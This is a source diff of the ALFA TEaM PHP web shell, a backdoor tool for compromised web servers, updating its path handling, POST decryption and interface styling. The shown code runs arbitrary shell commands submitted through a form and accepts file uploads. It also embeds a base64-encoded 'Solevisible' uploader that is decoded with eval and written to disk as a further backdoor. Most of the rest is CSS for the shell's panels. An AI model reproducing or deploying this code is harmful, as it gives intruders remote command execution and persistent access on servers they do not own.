-echo "PWD:<font color=#FFFFFF> " . str_replace("\\","/",@getcwd()) . "/<br />";
+echo "PWD:<font color=#FFFFFF> " . str_replace("\\","/",@alfaGetCwd()) . "/<br />";
 echo "<b style='color: #7CFC00'>Safe Mode : $r<br>";
 echo"<font color=#7CFC00>Disable functions : </font>";
 $disfun = @ini_get('disable_functions');
@@ -645,7 +835,7 @@ echo"</font><br>";
 echo "<b style='color: #7CFC00'>Your Ip Address is :  </font><font color=white>" . $_SERVER['REMOTE_ADDR'] . "</font><br>";
 echo "<b style='color: #7CFC00'>Server Ip Address is :  </font><font color=white>".(function_exists('gethostbyname')?@gethostbyname($_SERVER["HTTP_HOST"]):'???')."</font><br><p>";
 echo '<hr><center><form onSubmit="this.upload.disabled=true;this.cwd.value = btoa(unescape(encodeURIComponent(this.cwd.value)));" action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
-echo 'CWD: <input type="text" name="cwd" value="'.str_replace("\\","/",@getcwd()).'/" size="59"><p><input type="file" name="file" size="45"><input name="upload" type="submit" id="_upl" value="Upload"></p></form></center>';
+echo 'CWD: <input type="text" name="cwd" value="'.str_replace("\\","/",@alfaGetCwd()).'/" size="59"><p><input type="file" name="file" size="45"><input name="upload" type="submit" id="_upl" value="Upload"></p></form></center>';
 if(isset($_FILES['file'])){
 if(@move_uploaded_file($_FILES['file']['tmp_name'], __ZGVjb2Rlcg(@$_POST['cwd']).'/'.$_FILES['file']['name'])){echo '<b><font color="#7CFC00"><center>Upload Successfully ;)</font></a><font color="#7CFC00"></b><br><br></center>'; }
 else{echo '<center><b><font color="#7CFC00">Upload failed :(</font></a><font color="#7CFC0"></b></center><br><br>'; }
@@ -654,7 +844,7 @@ echo '<hr><form onSubmit="this.execute.disabled=true;this.command_solevisible.va
 <hr><pre>';
 if(isset($_POST['command_solevisible'])){
 if(strtolower(substr(PHP_OS,0,3))=="win")$separator='&';else $separator=';';
-$solevisible = "cd '".addslashes(str_replace("\\","/",@getcwd()))."'".$separator."".__ZGVjb2Rlcg($_POST['command_solevisible']);
+$solevisible = "cd '".addslashes(str_replace("\\","/",@alfaGetCwd()))."'".$separator."".__ZGVjb2Rlcg($_POST['command_solevisible']);
 echo alfaEx($solevisible);
 }
 echo'</pre>
@@ -674,48 +864,54 @@ if(is_array($_POST[$key])){
 $i=0;
 foreach($_POST[$key] as $f) {
 $f = trim(str_replace(' ', '+',$f));
-$_POST[$key][$i] = decrypt_post($f, _AlfaSecretKey());
+$_POST[$key][$i] = decrypt_post($f);
 $i++;
 }
 }else{
 $value = trim(str_replace(' ', '+',$value));
-$_POST[$key] = decrypt_post($value, _AlfaSecretKey());
+$_POST[$key] = decrypt_post($value);
 }
 }
-$default_action = 'FilesMan';
+$default_action = 'FilesMan2';//'FilesMan';
 $default_use_ajax = true;
 $default_charset = 'Windows-1251';
 if(strtolower(substr(PHP_OS,0,3))=="win")
 $GLOBALS['sys']='win';
 else
 $GLOBALS['sys']='unix';
-$GLOBALS['home_cwd'] = @getcwd();
-if($_POST["a"] != "GetPathHistory"){
-	if($_SESSION[__LAST_CWD__]!=$_POST['c']){
-		$_SESSION[__PATH_HISTORY__] = $_SESSION[__LAST_CWD__];
-	}
-}
+$GLOBALS['home_cwd'] = @alfaGetCwd();
 $GLOBALS["need_to_update_header"] = "false";
+$GLOBALS['glob_chdir_false'] = false;
 if(isset($_POST['c'])){
 if(!@chdir($_POST['c'])){
 	$GLOBALS['glob_chdir_false'] = true;
 }
 }
-$GLOBALS['cwd'] = (isset($_SESSION[__LAST_CWD__])&&$_SESSION[__LAST_CWD__]!=''&&!isset($_POST['c'])?$_SESSION[__LAST_CWD__]:@getcwd());
-if(!@is_dir){$GLOBALS['cwd'] = @getcwd();}
+$GLOBALS['cwd'] = (isset($_POST['c']) && @is_dir($_POST['c']) ?$_POST['c']:@alfaGetCwd());
+if($GLOBALS['glob_chdir_false']){
+	$GLOBALS['cwd'] = (isset($_POST['c']) && !empty($_POST['c']) ? $_POST['c'] : @alfaGetCwd());
+}
 if($GLOBALS['sys'] == 'win'){
 $GLOBALS['home_cwd'] = str_replace("\\", "/", $GLOBALS['home_cwd']);
 $GLOBALS['cwd'] = str_replace("\\", "/", $GLOBALS['cwd']);
-$_SESSION[__PATH_HISTORY__] = str_replace("\\", "/", $_SESSION[__PATH_HISTORY__]);
 }
 if($GLOBALS['cwd'][strlen($GLOBALS['cwd'])-1] != '/' )$GLOBALS['cwd'] .= '/';
-function alfaGetPathHistory(){echo (isset($_SESSION[__PATH_HISTORY__])&&!empty($_SESSION[__PATH_HISTORY__])?$_SESSION[__PATH_HISTORY__]: $GLOBALS['home_cwd']);}
-function alfahead(){
 if(!function_exists('sys_get_temp_dir')){function sys_get_temp_dir() {foreach (array('TMP', 'TEMP', 'TMPDIR') as $env_var) {if ($temp = getenv($env_var)) {return $temp;}}$temp = tempnam($GLOBALS['__file_path'], '');if (_alfa_file_exists($temp,false)) {unlink($temp);return dirname($temp);}return null;}}
+if(!function_exists("mb_strlen")){
+	function mb_strlen($str, $c=""){
+		return strlen($str);
+	}
+}
+if(!function_exists("mb_substr")){
+	function mb_substr($str, $start, $end, $c=""){
+		return substr($str, $start, $end);
+	}
+}
+define("ALFA_TEMPDIR", (function_exists("sys_get_temp_dir") ? (@is_writable(str_replace('\\','/',sys_get_temp_dir()))?sys_get_temp_dir():(@is_writable('.')?'.':false)) : false));
+function alfahead(){
 $GLOBALS['__ALFA_SHELL_CODE'] = 'PD9waHAgZWNobyAiPHRpdGxlPlNvbGV2aXNpYmxlIFVwbG9hZGVyPC90aXRsZT5cbjxib2R5IGJnY29sb3I9IzAwMDAwMD5cbjxicj5cbjxjZW50ZXI+PGZvbnQgY29sb3I9XCJ3aGl0ZVwiPjxiPllvdXIgSXAgQWRkcmVzcyBpczwvYj4gPGZvbnQgY29sb3I9XCJ3aGl0ZVwiPjwvZm9udD48L2NlbnRlcj5cbjxiaWc+PGZvbnQgY29sb3I9XCIjN0NGQzAwXCI+PGNlbnRlcj5cbiI7ZWNobyAkX1NFUlZFUlsnUkVNT1RFX0FERFInXTtlY2hvICI8L2NlbnRlcj48L2ZvbnQ+PC9hPjxmb250IGNvbG9yPVwiIzdDRkMwMFwiPlxuPGJyPlxuPGJyPlxuPGNlbnRlcj48Zm9udCBjb2xvcj1cIiM3Q0ZDMDBcIj48YmlnPlNvbGV2aXNpYmxlIFVwbG9hZCBBcmVhPC9iaWc+PC9mb250PjwvYT48Zm9udCBjb2xvcj1cIiM3Q0ZDMDBcIj48L2ZvbnQ+PC9jZW50ZXI+PGJyPlxuPGNlbnRlcj48Zm9ybSBtZXRob2Q9J3Bvc3QnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnIG5hbWU9J3VwbG9hZGVyJz4iO2VjaG8gJzxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlIiBzaXplPSI0NSI+PGlucHV0IG5hbWU9Il91cGwiIHR5cGU9InN1Ym1pdCIgaWQ9Il91cGwiIHZhbHVlPSJVcGxvYWQiPjwvZm9ybT48L2NlbnRlcj4nO2lmKGlzc2V0KCRfUE9TVFsnX3VwbCddKSYmJF9QT1NUWydfdXBsJ109PSAiVXBsb2FkIil7aWYoQG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkge2VjaG8gJzxiPjxmb250IGNvbG9yPSIjN0NGQzAwIj48Y2VudGVyPlVwbG9hZCBTdWNjZXNzZnVsbHkgOyk8L2ZvbnQ+PC9hPjxmb250IGNvbG9yPSIjN0NGQzAwIj48L2I+PGJyPjxicj4nO31lbHNle2VjaG8gJzxiPjxmb250IGNvbG9yPSIjN0NGQzAwIj48Y2VudGVyPlVwbG9hZCBmYWlsZWQgOig8L2ZvbnQ+PC9hPjxmb250IGNvbG9yPSIjN0NGQzAwIj48L2I+PGJyPjxicj4nO319ZWNobyAnPGNlbnRlcj48c3BhbiBzdHlsZT0iZm9udC1zaXplOjMwcHg7IGJhY2tncm91bmQ6IHVybCgmcXVvdDtodHRwOi8vc29sZXZpc2libGUuY29tL2ltYWdlcy9iZ19lZmZlY3RfdXAuZ2lmJnF1b3Q7KSByZXBlYXQteCBzY3JvbGwgMCUgMCUgdHJhbnNwYXJlbnQ7IGNvbG9yOiByZWQ7IHRleHQtc2hhZG93OiA4cHggOHB4IDEzcHg7Ij48c3Ryb25nPjxiPjxiaWc+c29sZXZpc2libGVAZ21haWwuY29tPC9iPjwvYmlnPjwvc3Ryb25nPjwvc3Bhbj48L2NlbnRlcj4nOz8+';
 $alfa_uploader = '$x = base64_decode("'.$GLOBALS['__ALFA_SHELL_CODE'].'");$solevisible = fopen("solevisible.php","w");fwrite($solevisible,$x);';
 define("ALFA_UPLOADER", "eval(base64_decode('".__ZW5jb2Rlcg($alfa_uploader)."'))");
-define("ALFA_TEMPDIR", (function_exists("sys_get_temp_dir") ? (@is_writable(str_replace('\\','/',sys_get_temp_dir()))?sys_get_temp_dir():(@is_writable('.')?'.':false)) : false));
 if(!isset($_POST['ajax'])){
 function Alfa_GetDisable_Function(){
 $disfun = @ini_get('disable_functions');
@@ -746,7 +942,7 @@ if($i <= count($func)){
 $all = array_values(array_merge($black_list, $allow_list));
 return('<span class="disable_functions">'.implode(" | ", $all).'</span>');
 }
-return('<span class="disable_functions">'.$dis.'</span><a href=javascript:void(0) onclick="g(\'GetDisFunc\',null,\'wp\');"><span class="header_show_all">Show All ('.$i.')</span></a>');
+return('<span class="disable_functions">'.$dis.'</span><a id="menu_opt_GetDisFunc" href=javascript:void(0) onclick="alfa_can_add_opt = true;g(\'GetDisFunc\',null,\'wp\');"><span class="header_show_all">Show All ('.$i.')</span></a>');
 }
 function AlfaNum(){
 $args = func_get_args();
@@ -782,7 +978,7 @@ if(function_exists('curl_version'))
 $curl=$on;
 else
 $curl=$of;
-if(function_exists('mysql_get_client_info'))
+if(function_exists('mysql_get_client_info')||class_exists('mysqli'))
 $mysql=$on;
 else
 $mysql=$of;
@@ -841,10 +1037,13 @@ $cwd_links = '';
 $path = explode("/", $GLOBALS['cwd']);
 $n=count($path);
 for($i=0; $i<$n-1; $i++) {
-$cwd_links .= "<a class='header_pwd' href='javascript:void(0);' onclick='g(\"FilesMan\",\"";
-for($j=0; $j<=$i; $j++)
+$cwd_links .= "<a class='header_pwd' onclick='g(\"FilesMan\",\"";
+$cach_cwd_path = "";
+for($j=0; $j<=$i; $j++){
 $cwd_links .= $path[$j].'/';
-$cwd_links .= "\")'>".$path[$i]."/</a>";
+$cach_cwd_path .= $path[$j].'/';
+}
+$cwd_links .= "\")' path='".$cach_cwd_path."' href='#action=fileman&path=".$cach_cwd_path."'>".$path[$i]."/</a>";
 }
 $drives = "";
 foreach(range('a','z') as $drive)
@@ -857,865 +1056,41 @@ echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <meta name="ROBOTS" content="NOINDEX, NOFOLLOW" />
 <link href="'.__showicon('alfamini').'" rel="icon" type="image/x-icon"/>
-<title>..:: '.$_SERVER['HTTP_HOST'].' ~ ALFA TEaM Shell - v'.__ALFA_VERSION__.' ::..</title>
-<link href="https://fonts.googleapis.com/css?family=Francois+One" rel="stylesheet">
-<style type="text/css">
-.hlabale {
-    color: #67ABDF;
-    border-radius: 4px;
-    border: 1px solid #27979B;
-    margin-left: 7px;
-    padding: 2px;
-}
-#tbl_sympphp tr {
-	text-align: center;
-}
-.editor-view {
-	position: relative;
-}
-.view-content {
-	position: absolute;
-	overflow-y: auto;
-	width: 100%;
-	height: 475px;
-}
-*::-webkit-scrollbar-track {
-	-webkit-box-shadow: inset 0 0 6px rgba(0,0,0,0.3);
-	border-radius: 10px;
-	background-color: #000115;
-}
-*::-webkit-scrollbar{
-	width: 10px;
-	background-color: #000115;
-}
-*::-webkit-scrollbar-thumb {
-	border-radius: 10px;
-	-webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);
-	background-color: rgb(30, 130, 181);
-}
-.editor-file-name {
-	margin-left: 29px;
-	margin-top: 4px;
-	overflow: hidden;
-    text-overflow: ellipsis;
-    white-space: nowrap;
-}
-.editor-icon {
-	position: absolute;
-}
-.is_active {
-	background: rgba(49, 55, 93, 0.77);
-	border-radius: 10px;
-}
-.history-list {
-	height: 88%;
-	overflow-y: auto;
-}
-#editor-minimized,#cgiloader-minimized {
-	display: block;
-	position: fixed;
-	right: -30px;
-	width: 30px;
-	height: 30px;
-	top: 30%;
-}
-.minimized-wrapper {
-	position: relative;
-	background: rgb(14, 48, 74);
-    width: 44px;
-    height: 167px;
-	cursor: pointer;
-	border-bottom-left-radius: 5px;
-	border-top-left-radius: 5px;
-}
-.minimized-text {
-    transform: rotate(-90deg);
-    color: wheat;
-    font-size: x-large;
-    display: inline-block;
-    position: absolute;
-    right: -51px;
-    width: 129px;
-    top: 50px;
-    border-top-left-radius: 4%;
-    height: 56px;
-    padding: 3px
-}
-.close-button,.editor-minimize {
-	height: 26px;
-    width: 38px;
-    right: 7px;
-    background: rgb(29, 86, 115);
-    cursor: pointer;
-    position: absolute;
-    box-sizing: border-box;
-    line-height: 50px;
-    display: inline-block;
-    top: 17px;
-    border-radius: 100px;
-}
-.editor-minimize {right: 50px;}
-.close-button:before,.close-button:after,.editor-minimize:before {
-	transform: rotate(-45deg);
-    content: "";
-    position: absolute;
-    top: 63%;
-    right: 6px;
-    margin-top: -5px;
-    margin-left: -25px;
-    display: block;
-    height: 4px;
-    width: 27px;
-    background-color: rgba(216, 207, 207, 0.75);
-    transition: all 0.25s ease-out;
-}
-.editor-minimize:before{
-	transform: rotate(0deg);
-}
-.close-button:after {
-  transform: rotate(-135deg);
-}
-.close-button:hover:before,.close-button:hover:after,.editor-minimize:hover:before{
-	background-color: red;
-}
-.close-button:hover,.editor-minimize:hover{
-	background-color: rgba(39, 66, 80, 0.96);
-}
-#editor,#cgiloader {
-	display: none;
-	position: fixed;
-    top: 0;
-	width: 100%;
-	height: 100%;
-}
-.editor-wrapper {
-	width: 100%;
-    height: 100%;
-    position: relative;
-    top: 1%;
-}
-.editor-header {
-	width: 97%;
-    background: rgba(21, 66, 88, 0.93);
-    height: 37px;
-    margin-left: 13px;
-    position: relative;
-	border-top-left-radius: 15px;
-	border-top-right-radius: 15px;
-}
-.editor-path {
-	position: absolute;
-    font-size: x-large;
-    margin-left: 10px;
-    top: 6px;
-    color: springgreen;
-}
-.editor-modal {
-    position: relative;
-    top: 0;
-    background-color: rgba(0, 1, 23, 0.95);
-    height: 90%;
-    margin-left: 20%;
-    margin-right: 2%;
-    border: 2px #0e304a solid;
-}
-.editor-explorer {
-    width: 19%;
-    height: 90%;
-    background-color: rgba(0, 1, 23, 0.94);
-    position: absolute;
-    z-index: 2;
-    left: 1%;
-    border: 2px rgb(14, 48, 74) solid;
-}
-.editor-controller {
-	position: relative;
-	top: -13px;
-}
-.file-holder {
-	position: relative;
-    width: 100%;
-    height: 30px;
-}
-.file-holder > .history {
-	position: absolute;
-    color: rgb(3, 179, 163);
-    cursor: pointer;
-	left:5px;
-    font-size: 18px;
-    font-family: sans-serif;
-	width:89%;
-	height:100%;
-	z-index: 3;
-	border-radius: 10px;
-	transition: background-color 600ms ease-out;
-}
-.file-holder > .history-close {
-	display: block;
-    opacity: 0;
-    position: absolute;
-    right: 2px;
-    width: 20px;
-    top: 4px;
-    text-align: center;
-    cursor: pointer;
-    color: white;
-    background: red;
-    border-radius: 100px;
-    font-family: monospace;
-    z-index: 10;
-    transition: opacity 600ms ease-out;
-    font-size: 15px;
-    height: 19px;
-}
-.file-holder > .history:hover {
-	background-color: #646464;
-}
-.editor-explorer > .hheader {
-	position: relative;
-    color: rgb(20, 255, 7);
-    border-bottom: 2px rgb(32, 106, 162) solid;
-    text-align: center;
-    font-family: sans-serif;
-    margin-bottom: 10px;
-	height: 55px;
-}
-.editor-search {
-	position: absolute;
-    bottom: 7px;
-    left: 31px;
-}
-.hheader-text {
-	position: absolute;
-    left: 8px;
-    top: 2px;
-}
-.history-clear {
-	position: absolute;
-    right: 8px;
-    top: 2px;
-    cursor: pointer;
-}
-.editor-body {
-	position: relative;
-	margin-left: 3px;
-}
-.editor-anim-close {
-	'.showAnimation("editorClose").'
-}
-@keyframes editorClose {
-	0% {
-		transform: scale(1);
-		opacity: 1;
-	}
-	100% {
-		transform: scale(0);
-		opacity: 0;
-	}
-}
-.editor-anim-minimize {
-	'.showAnimation("editorMinimize").'
-}
-@keyframes editorMinimize {
-	0% {
-		right:0px;
-		opacity: 1;
-	}
-	100% {
-		right: -2000px;
-		opacity: 0;
-	}
-}
-.editor-anim-show {
-	'.showAnimation("editorShow").'
-}
-@keyframes editorShow {
-	0% {
-		right:-2000px;
-		opacity: 0;
-	}
-	100% {
-		right: 0px;
-		opacity: 1;
-	}
-}
-.minimized-show {
-	'.showAnimation("minimizeShow").'
-}
-@keyframes minimizeShow {
-	0% {
-		right: -30px;
-		opacity: 0;
-	}
-	100% {
-		right: 0px;
-		opacity: 1;
-	}
-}
-.minimized-hide {
-	'.showAnimation("minimizeHide").'
-}
-@keyframes minimizeHide {
-	0% {
-		right: 0px;
-		opacity: 1;
-	}
-	100% {
-		right: -30px;
-		opacity: 0;
-	}
-}
-.solevisible-text:hover {
-	-webkit-text-shadow: 0px 0px 25px #00FF00;
-	-moz-text-shadow: 0px 0px 25px #00FF00;
-	-ms-text-shadow: 0px 0px 25px #00FF00;
-	text-shadow: 0px 0px 25px #00FF00;
-}
-.update-holder {
-    position: fixed;
-    top: 0;
-    background-color: rgba(0, 24, 29, 0.72);
-    width: 100%;
-    height: 100%;
-}
-.update-partner {
-    width: 50%;
-    position: relative;
-    border-radius: 31px;
-    height: 200px;
-    background-color: rgba(3, 3, 41, 0.47);
-    text-align: center;
-    color: rgba(252, 253, 251, 0.88);
-    margin-left: 25%;
-    top: 23%;
-    font-family: "Francois One", sans-serif;
-}
-.update-partner:hover {
--webkit-box-shadow: inset 0px 0px 99px 9px rgba(11,15,41,1);
--moz-box-shadow: inset 0px 0px 99px 9px rgba(11,15,41,1);
-box-shadow: inset 0px 0px 99px 9px rgba(11,15,41,1);
-}
-.update-content {
-	position: relative;
-}
-.update-content > a {
-    text-decoration: none;
-    position: absolute;
-    color: rgba(103, 167, 47, 0.77);
-    left: 24%;
-    margin-top: 7%;
-    font-size: 40px;
-    font-family: "Francois One", sans-serif;
-}
-.update-close {
-	position: absolute;
-    right: 0;
-    margin-right: 23px;
-    top: 10px;
-    font-size: 27px;
-    background-color: #130f50;
-    width: 5%;
-    border-radius: 100px;
-    cursor: pointer;
-    border: 2px rgb(14, 38, 90) solid;
-}
-.update-close:hover {
-	border: 2px #25ff00 solid;
-    color: #FF0000;
-}
-.filestools {
-    height: auto;
-    width: auto;
-    color: #67ABDF;
-    font-size: 12px;
-    font-family: Verdana,Geneva,sans-serif;
-}
-@-moz-document url-prefix() {
-	#search-input {
-		width: 173px;
-	}
-	.editor-path {
-		top:3px;
-	}
-}
+<title>..:: '.$_SERVER['HTTP_HOST'].' ~ ALFA TEaM Shell - v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ::..</title>
+<style type="text/css">';?>
+.hlabale{color:#67abdf;border-radius:4px;border:1px solid #27979b;margin-left:7px;padding:2px}#tbl_sympphp tr{text-align:center}#PhpCode,.php-evals-ace,.view_ml_content{position:absolute;top:0;right:0;bottom:0;left:0;background:#1b292b26;top:50px}.editor-view{position:relative;height:100%}.view-content{position:absolute;overflow-y:auto;width:100%;height:93%}::-webkit-scrollbar-track{-webkit-box-shadow:inset 0 0 6px rgba(0,0,0,.3);border-radius:10px;background-color:#000115}::-webkit-scrollbar{width:10px;background-color:#000115}::-webkit-scrollbar-thumb{border-radius:10px;-webkit-box-shadow:inset 0 0 6px rgba(0,0,0,.3);background-color:#1e82b5}.editor-file-name{margin-left:29px;margin-top:4px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.editor-icon{position:absolute}.is_active{background:rgba(49,55,93,.77);border-radius:10px}.history-list{height:88%;overflow-y:auto}.opt-title{position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);color:#2fd051;font-size:25px;font-family:monospace}.options_min_badge{visibility:hidden;text-align:center;right:30px;color:#fff;background:#2a8a24;padding:6px;border-radius:50%;width:15px;height:15px;display:inline-block;position:absolute;top:-7px}#cgiloader-minimized,#database_window-minimized,#editor-minimized,#options_window-minimized{display:block;position:fixed;right:-30px;width:30px;height:30px;top:30%;z-index:9999}.minimized-wrapper{position:relative;background:#0e304a;width:44px;height:130px;cursor:pointer;border-bottom-left-radius:5px;border-top-left-radius:5px}.minimized-text{transform:rotate(-90deg);color:wheat;font-size:x-large;display:inline-block;position:absolute;right:-51px;width:129px;top:-10px;border-top-left-radius:4%;height:56px;padding:3px}.close-button,.editor-minimize{height:26px;width:38px;right:7px;background:#1d5673;cursor:pointer;position:absolute;box-sizing:border-box;line-height:50px;display:inline-block;top:17px;border-radius:100px}.editor-minimize{right:50px}.close-button:after,.close-button:before,.editor-minimize:before{transform:rotate(-45deg);content:"";position:absolute;top:63%;right:6px;margin-top:-5px;margin-left:-25px;display:block;height:4px;width:27px;background-color:rgba(216,207,207,.75);transition:all .25s ease-out}.editor-minimize:before{transform:rotate(0)}.close-button:after{transform:rotate(-135deg)}.close-button:hover:after,.close-button:hover:before,.editor-minimize:hover:before{background-color:red}.close-button:hover,.editor-minimize:hover{background-color:rgba(39,66,80,.96)}#cgiloader,#database_window,#editor,#options_window{display:none;position:fixed;top:0;width:100%;height:100%;z-index:20}.editor-wrapper{width:100%;height:100%;position:relative;top:1%}.editor-header{width:97%;background:rgba(21,66,88,.93);height:37px;margin-left:13px;position:relative;border-top-left-radius:15px;border-top-right-radius:15px}.editor-path{position:absolute;font-size:x-large;margin-left:10px;top:6px;color:#00ff7f}.editor-modal{position:relative;top:0;background-color:rgba(0,1,23,.95);height:90%;margin-left:20%;margin-right:2%;border:2px #0e304a solid}.editor-explorer{width:19%;height:90%;background-color:rgba(0,1,23,.94);position:absolute;z-index:2;left:1%;border:2px #0e304a solid}.editor-controller{position:relative;top:-13px}.file-holder{position:relative;width:100%;height:30px}.file-holder>.history{position:absolute;color:#03b3a3;cursor:pointer;left:5px;font-size:18px;font-family:sans-serif;width:89%;height:100%;z-index:3;border-radius:10px;transition:background-color .6s ease-out}.file-holder>.history-close{display:block;opacity:0;position:absolute;right:2px;width:20px;top:4px;text-align:center;cursor:pointer;color:#fff;background:red;border-radius:100px;font-family:monospace;z-index:10;transition:opacity .6s ease-out;font-size:15px;height:19px}.file-holder>.history:hover{background-color:#646464}.editor-explorer>.hheader{position:relative;color:#14ff07;border-bottom:2px #206aa2 solid;text-align:center;font-family:sans-serif;margin-bottom:10px;height:55px}.editor-search{position:absolute;bottom:7px;left:31px}.hheader-text{position:absolute;left:8px;top:2px}.history-clear{position:absolute;right:8px;top:2px;cursor:pointer}.editor-body{position:relative;margin-left:3px;height:100%}.editor-anim-close{-webkit-animation:editorClose .8s ease-in-out forwards;-moz-animation:editorClose .8s ease-in-out forwards;-ms-animation:editorClose .8s ease-in-out forwards;animation:editorClose .8s ease-in-out forwards}@keyframes editorClose{0%{visibility:1;opacity:1}100%{visibility:0;opacity:0}}.editor-anim-minimize{-webkit-animation:editorMinimize .8s ease-in-out forwards;-moz-animation:editorMinimize .8s ease-in-out forwards;-ms-animation:editorMinimize .8s ease-in-out forwards;animation:editorMinimize .8s ease-in-out forwards}@keyframes editorMinimize{0%{right:0;opacity:1}100%{right:-2000px;opacity:0}}.editor-anim-show{-webkit-animation:editorShow .8s ease-in-out forwards;-moz-animation:editorShow .8s ease-in-out forwards;-ms-animation:editorShow .8s ease-in-out forwards;animation:editorShow .8s ease-in-out forwards}@keyframes editorShow{0%{right:-2000px;opacity:0}100%{right:0;opacity:1}}.minimized-show{-webkit-animation:minimizeShow .8s ease-in-out forwards;-moz-animation:minimizeShow .8s ease-in-out forwards;-ms-animation:minimizeShow .8s ease-in-out forwards;animation:minimizeShow .8s ease-in-out forwards}@keyframes minimizeShow{0%{right:-30px;opacity:0}100%{right:0;opacity:1}}.minimized-hide{-webkit-animation:minimizeHide .8s ease-in-out forwards;-moz-animation:minimizeHide .8s ease-in-out forwards;-ms-animation:minimizeHide .8s ease-in-out forwards;animation:minimizeHide .8s ease-in-out forwards}@keyframes minimizeHide{0%{right:0;opacity:1}100%{right:-30px;opacity:0}}.solevisible-text:hover{-webkit-text-shadow:0 0 25px #0f0;-moz-text-shadow:0 0 25px #0f0;-ms-text-shadow:0 0 25px #0f0;text-shadow:0 0 25px #0f0}.update-holder{position:fixed;top:0;background-color:rgba(0,24,29,.72);width:100%;height:100%}.update-content{position:relative}.update-content>a{text-decoration:none;position:absolute;color:rgba(103,167,47,.77);left:24%;margin-top:7%;font-size:40px}.update-close{position:absolute;right:0;margin-right:23px;top:10px;font-size:27px;background-color:#130f50;width:5%;border-radius:100px;cursor:pointer;border:2px #0e265a solid}.update-close:hover{border:2px #25ff00 solid;color:red}.filestools{height:auto;width:auto;color:#67abdf;font-size:12px;font-family:Verdana,Geneva,sans-serif}@-moz-document url-prefix(){#search-input{width:173px}.editor-path{top:3px}}.filters-holder{padding:5px;padding-left:10px}.filters-holder input{width:200px}.filters-holder span{color:#8bc7f7}#rightclick_menu{width:175px;visibility:hidden;opacity:0;position:fixed;background:#0f304a;color:#555;font-family:sans-serif;font-size:11px;-webkit-transition:opacity .5s ease-in-out;-moz-transition:opacity .5s ease-in-out;-ms-transition:opacity .5s ease-in-out;-o-transition:opacity .5s ease-in-out;transition:opacity .5s ease-in-out;-webkit-box-shadow:-1px 0 17px 0 #8b8b8c;-moz-box-shadow:-1px 0 17px 0 #8b8b8c;box-shadow:-1px 0 17px 0 #8b8b8c;padding:0;border:1px solid #737373;border-radius:10px}#rightclick_menu a{display:block;color:#fff;font-weight:bolder;text-decoration:none;padding:6px 8px 6px 30px;position:relative;padding-left:40px}#rightclick_menu a i.fa,#rightclick_menu a img{height:20px;font-size:17px;width:20px;position:absolute;left:5px;top:2px;padding-left:5px}#rightclick_menu a span{color:#bcb1b3;float:right}#rightclick_menu a:hover{color:#fff;background:#3879d9}#rightclick_menu hr{border:1px solid #ebebeb;border-bottom:0}.cl-popup-fixed{position:fixed;top:0;left:0;width:100%;height:100%;background:#201e1ead}#shortcutMenu-holder{position:absolute;top:40%;left:50%;transform:translate(-50%,-50%);background:#1f1e1edb;height:190px;width:500px;color:#fff}#shortcutMenu-holder>.popup-head{background:#207174;padding:6px;border-top:10px;text-align:center;font-family:sans-serif;color:#fff}#shortcutMenu-holder>form{padding:10px}#shortcutMenu-holder>form>label{display:block}#shortcutMenu-holder>form>input{width:99%;height:24px;margin-top:4px;color:#fff;outline:0;font-size:16px}#shortcutMenu-holder>.popup-foot{float:right;height:30px;margin-right:8px}#shortcutMenu-holder>.popup-foot>button{height:100%;cursor:pointer;color:#fff;outline:0}.php-terminal-output{overflow:auto;height:86%;border:1px solid #1e5673;border-radius:10px}.cmd-history-holder{visibility:hidden;opacity:0;position:absolute;color:#dff3d5;background:#093d58;top:-300px;height:300px;width:calc(69% + -11px);border-radius:10px 10px 0 0;left:calc(2% - 9px);transition:visibility .5s,opacity .5s linear}.cmd-history-holder .commands-history-header{background:#37504e;text-align:center;border-radius:10px 10px 0 0}.cmd-history-icon{width:27px;top:6px;left:calc(69% + 5px);position:absolute;cursor:pointer}.history-cmd-line{padding:4px;border-bottom:1px dashed;cursor:pointer}.history-cmd-line:hover{background:#961111}#myUL,#myUL ul{list-style-type:none}#myUL{margin:0;padding:0}.box{cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.box::before{content:"\2610";color:#000;display:inline-block;margin-right:6px}.check-box::before{content:"\2611";color:#1e90ff}.nested{display:none}.active{display:block}.flag-holder>img{width:20px;vertical-align:middle;padding-left:6px}#options_window .content_options_holder .options_holder{position:relative;display:none;overflow:auto;min-height:300px;max-height:calc(100vh - 100px)}#options_window .content_options_holder .options_holder .header{min-height:50vh}#options_window .content_options_holder .options_holder.option_is_active{display:block}#options_window .content_options_holder .options_tab{padding:5px;margin-left:14px;margin-right:30px;background:#000;border-bottom:7px solid #0f304a;border-left:7px solid #0f304a;border-right:7px solid #0f304a;overflow-x:auto;white-space:nowrap}#filesman_tabs .filesman_tab img,#options_window .content_options_holder .options_tab .tab_name img,.editor-tab-name img,.sql-tabs .sql-tabname img,.terminal-tabs .terminal-tab img{width:10px;vertical-align:middle;margin-left:5px}#filesman_tabs .filesman_tab,#options_window .content_options_holder .options_tab .tab_name,.editor-tab-name,.sql-tabs .sql-newtab,.sql-tabs .sql-tabname,.terminal-tabs .terminal-tab{display:inline-block;background-color:#133d51;border-radius:4px;padding:5px;color:#fff;margin-right:3px;padding:5px;cursor:pointer;margin-bottom:1px;transition:background-color .5s}#filesman_tabs .filesman_tab{min-width:55px;text-align:center}#filesman_tabs .filesman_tab:hover,#options_window .content_options_holder .options_tab .tab_name:hover,.editor-tab-name:hover,.sql-tabs .sql-tabname:hover,.terminal-tabs .terminal-tab:hover{background-color:#a23939}.editor-tabs,.sql-tabs,.terminal-tabs{padding:5px;overflow-x:auto;white-space:nowrap}.options-loader-holder{position:absolute;top:0;left:0;width:100%;height:100%;background:#2b2626c7;z-index:11}.options-loader-holder img{position:absolute;top:32%;left:45%;transform:translate(-50%,-50%);width:100px;animation:spin 2s infinite}#filesman_tabs .filesman_tab.filesman-tab-active,#options_window .content_options_holder .options_tab 